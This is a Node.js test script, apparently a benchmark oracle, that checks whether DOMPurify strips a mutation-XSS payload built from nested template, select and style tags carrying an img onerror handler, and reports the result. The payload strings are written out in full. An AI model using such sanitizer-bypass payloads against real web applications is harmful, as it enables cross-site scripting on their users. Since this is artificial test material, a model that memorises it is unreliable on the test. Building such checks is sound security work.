'use strict';

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let operation_completed = false;

try {
  const { JSDOM } = (() => {
    try {
      return require('jsdom');
    } catch (e) {
      return {};
    }
  })();

  const createDOMPurify = require('dompurify');

  let DOMPurifyInstance = null;

  if (JSDOM) {
    const window = new JSDOM('').window;
    DOMPurifyInstance = createDOMPurify(window);
  } else if (createDOMPurify && typeof createDOMPurify.sanitize === 'function') {
    DOMPurifyInstance = createDOMPurify;
  }

  if (!DOMPurifyInstance || typeof DOMPurifyInstance.sanitize !== 'function') {
    throw new Error('Unable to obtain a usable DOMPurify instance in this Node environment (jsdom unavailable)');
  }

  // --- Benign input first: prove normal sanitize() works ---
  const benignInput = '<div><b>hello</b> world</div>';
  const benignOutput = DOMPurifyInstance.sanitize(benignInput);

  if (typeof benignOutput !== 'string' || !benignOutput.includes('hello') || !benignOutput.includes('world')) {
    throw new Error('Benign sanitize operation did not behave as expected: ' + JSON.stringify(benignOutput));
  }

  // Also verify a known-dangerous simple payload is removed, confirming
  // the sanitizer is actually functioning (not a no-op / broken install).
  const simpleDangerous = '<img src=x onerror="alert(1)">';
  const simpleSanitized = DOMPurifyInstance.sanitize(simpleDangerous);
  if (/onerror/i.test(simpleSanitized)) {
    throw new Error('Baseline sanitize() failed to strip a trivial onerror attribute; environment is unreliable: ' + JSON.stringify(simpleSanitized));
  }

  // Benign calls succeeded; from here on exceptions count as "blocked".
  operation_completed = true;

  // --- Malicious input: mXSS payload exploiting nested template/select/style
  // parsing quirks (CVE fixed after 3.2.3). This relies on how the HTML
  // parser handles <style> inside <select> inside <template>, which upon
  // DOMPurify's internal clobbering/serialization logic can leak an
  // executable <img onerror> construct into the sanitized output.
  const maliciousInput =
    '<template><select><style></select><img src=x onerror="window.__DOMPURIFY_ORACLE_PWNED__=true"></style></select></template>';

  const maliciousOutput = DOMPurifyInstance.sanitize(maliciousInput);

  const hasOnerror = /onerror\s*=/i.test(maliciousOutput);
  const hasScriptTag = /<script/i.test(maliciousOutput);
  const hasImgWithHandler = /<img[^>]*onerror/i.test(maliciousOutput);

  let exploit_succeeded = false;
  let evidence;

  if (hasOnerror || hasScriptTag || hasImgWithHandler) {
    exploit_succeeded = true;
    evidence =
      'Sanitized output retained a dangerous executable construct (onerror attribute or script tag) ' +
      'surviving DOMPurify.sanitize() for mXSS payload: ' + JSON.stringify(maliciousOutput);
  } else {
    exploit_succeeded = false;
    evidence =
      'DOMPurify.sanitize() correctly neutralized the mXSS payload; no dangerous attributes or tags survived. ' +
      'Sanitized output: ' + JSON.stringify(maliciousOutput);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (err) {
  if (!operation_completed) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Setup, module-resolution, fixture, or benign-operation exception: ' + (err && err.stack ? err.stack : String(err))
    });
  } else {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'Malicious input triggered an exception after benign operation succeeded (treated as blocked): ' + (err && err.stack ? err.stack : String(err))
    });
  }
}
